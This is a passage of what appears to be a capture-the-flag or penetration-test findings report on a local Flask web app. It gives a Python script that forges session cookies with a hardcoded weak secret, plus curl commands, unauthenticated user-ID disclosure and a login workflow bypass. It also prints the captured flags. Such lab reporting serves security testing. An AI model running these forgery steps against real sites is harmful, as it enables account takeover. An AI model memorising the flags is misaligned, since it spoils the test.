**Prerequisites:**
- Knowledge of the weak secret key: 'your_secret_key' (hardcoded in source code)
- Target user_id (obtainable via AUTHZ-VULN-03)

**Exploitation Steps:**

1. Create Python script to forge Flask session cookie:
```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = 'your_secret_key'

session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(app)

# Forge session for flag user (ID: 10052)
session_data = {'user_id': 10052}
forged_cookie = serializer.dumps(session_data)
print(f"Forged session cookie: {forged_cookie}")
```

2. Access dashboard with forged session cookie (NO AUTHENTICATION REQUIRED):
```bash
curl http://localhost:40477/dashboard \
  -b "session=<FORGED_COOKIE_VALUE>"
```

**Proof of Impact:**

Using a freshly forged session cookie, direct access to the flag user's dashboard is achieved without any authentication:

Response contains:
```html
<h5 class="card-title">Welcome, Flag FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}</h5>
```

**Flag Captured:** `FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}`

**Notes:**
- The vulnerable configuration is at __init__.py:11: `app.secret_key = 'your_secret_key'`
- Flask uses itsdangerous library to HMAC-sign session cookies
- With the known weak secret, the signature validation is meaningless
- Both integer and string user_id values work (SQLAlchemy handles type coercion)
- Session cookies must be freshly generated due to timestamp validation

---

### AUTHZ-VULN-03: Unauthenticated Information Disclosure (Horizontal)

**Summary:**
- **Vulnerable location:** GET /password/<username> endpoint (routes.py:44-64)
- **Overview:** User information (first_name, user_id, username) is exposed to unauthenticated visitors before password authentication
- **Impact:** Enables reconnaissance for IDOR attacks by providing exact user IDs; username enumeration
- **Severity:** HIGH

**Prerequisites:** None - completely unauthenticated access

**Exploitation Steps:**

1. Access password page for any known username without authentication:
```bash
# Test user information disclosure
curl http://localhost:40477/password/test

# Flag user information disclosure
curl http://localhost:40477/password/flag
```

**Proof of Impact:**

**Test user (ID: 10032):**
```html
<p class="mt-3 text-center">Welcome, John!</p>
<input type="text" class="form-control" id="username" name="username" value="test" hidden>
<input type="text" class="form-control" id="user_id" name="user_id" value="10032" hidden>
```

**Flag user (ID: 10052):**
```html
<p class="mt-3 text-center">Welcome, Flag!</p>
<input type="text" class="form-control" id="username" name="username" value="flag" hidden>
<input type="text" class="form-control" id="user_id" name="user_id" value="10052" hidden>
```

This information is exposed in HTML hidden form fields and visible page content BEFORE any password authentication occurs.

**Notes:**
This vulnerability enables the other horizontal privilege escalation attacks by providing the exact user IDs needed for:
- X-UserId header values (AUTHZ-VULN-01)
- Session forgery targets (AUTHZ-VULN-02)
- Username enumeration for reconnaissance

---

### AUTHZ-VULN-04: Workflow Bypass - Direct Password Page Access (Context_Workflow)

**Summary:**
- **Vulnerable location:** GET /password/<username> endpoint (routes.py:44-64)
- **Overview:** Users can skip the username validation step and access the password entry form directly
- **Impact:** Bypass intended two-step authentication workflow; potential evasion of username validation rate limiting or logging
- **Severity:** MEDIUM

**Prerequisites:** Knowledge of a valid username

**Exploitation Steps:**

1. Skip username validation (POST /) and navigate directly to password page:
```bash
# Expected workflow: POST / first, then GET /password/<username>
# Actual: Direct access works without POST /

curl http://localhost:40477/password/test
```

**Proof of Impact:**

Direct access to password page succeeds without visiting the username validation endpoint:
```html
<p class="mt-3 text-center">Welcome, John!</p>
<label for="password">Password</label>
<input type="password" class="form-control" id="password" name="password" required>
```

The password entry form is rendered successfully, allowing workflow step 1 (username validation) to be completely bypassed.

**Notes:**
- Limited practical impact since valid usernames are still required
- Demonstrates lack of state tracking in multi-step authentication workflow
- No session flags track which steps have been completed (e.g., 'username_validated')
- Overlaps with AUTHZ-VULN-03 (same endpoint also exposes user information)

---

### AUTHZ-VULN-05: Dashboard Access via Forged Session (Context_Workflow Bypass)

**Summary:**
- **Vulnerable location:** GET /dashboard endpoint (routes.py:68-86) combined with weak secret key (__init__.py:11)
- **Overview:** Complete authentication workflow bypass through session forgery - access dashboard without completing any authentication steps
- **Impact:** Skip all authentication steps (username validation, password verification) via forged session cookie
- **Severity:** CRITICAL

**Prerequisites:**
- Knowledge of weak secret key: 'your_secret_key'
- Target user_id (obtainable via AUTHZ-VULN-03)

**Exploitation Steps:**

This vulnerability overlaps with AUTHZ-VULN-02 (session forgery) but is analyzed from a workflow perspective:

**Expected workflow:**
1. POST / (username validation)
2. GET /password/<username> (display form)
3. POST /password/<username> (password validation)
4. Session creation (session['user_id'] set)
5. GET /dashboard (authorized access)

**Actual workflow with forged session:**
1. Forge session cookie with weak secret key (see AUTHZ-VULN-02)
2. GET /dashboard directly - SKIP ALL AUTHENTICATION STEPS

**Proof of Impact:**

Using the same forged session cookie from AUTHZ-VULN-02:
```bash
curl http://localhost:40477/dashboard \
  -b "session=<FORGED_COOKIE>"
```

Response:
```html
<h5 class="card-title">Welcome, Flag FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}</h5>
```

**Flag Captured:** `FLAG{39c35247bd1ebb5196f6e49b51300fd895e4ce83559a7db6b89cc8b76b31c59f}`

**Notes:**
- This is the same technical vulnerability as AUTHZ-VULN-02, viewed from a workflow perspective
- Demonstrates complete absence of workflow state validation
- No session legitimacy checks beyond HMAC signature (which is forged)
- Session cookie alone grants full access without any authentication history
- Overlaps with AUTHZ-VULN-02 (cryptographic weakness) but focuses on workflow integrity
